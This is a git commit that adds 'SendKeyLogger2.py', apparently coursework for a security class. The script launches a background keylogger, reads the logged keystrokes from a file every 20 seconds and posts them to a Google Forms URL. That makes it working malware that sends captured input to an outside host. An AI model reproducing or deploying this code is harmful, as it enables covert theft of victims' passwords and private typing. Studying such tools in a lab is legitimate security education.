e347a4d61f9ae7fa40897d9b3236d6119579ea06
Richard Dunbar <112132616+RND27@users.noreply.github.com>
2022-11-28 00:11:41 -0500

    Create SendKeyLogger2.py
    Functions Commented Out

---
+++ Week_13 ( Reconnaissance | Scanning)/Remote Form/SendKeyLogger2.py
@@ -0,0 +1,32 @@
+#!/usr/bin/python3
+
+import requests
+import time
+import os
+from pynput.keyboard import Listener
+
+startlog = time.time()
+
+os.system("python3 /home/student/Desktop/scripts/keyloggerRemoteTest.py &")
+time.sleep(1)
+
+def send_request():
+    form_input = open("/home/student/Desktop/scripts/keyboard_Input.txt")
+    form_send = form_input.read()
+    url= "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiMHViuoPlW3UujN2b0M3xiT81aKGeEp779j46XlD58PzZ1A/formResponse"
+    form_data = {'entry.2005620554': f"'{form_send}'"}
+    r = requests.post(url, data=form_data)
+
+def interval():
+    global startlog
+    if time.time() - 20 > startlog:
+        #print('Its been 20 secs')
+        send_request()
+        startlog = time.time()
+
+counter = 0
+while True:
+    counter += 1
+    #print(counter)
+    interval()
+    time.sleep(1)
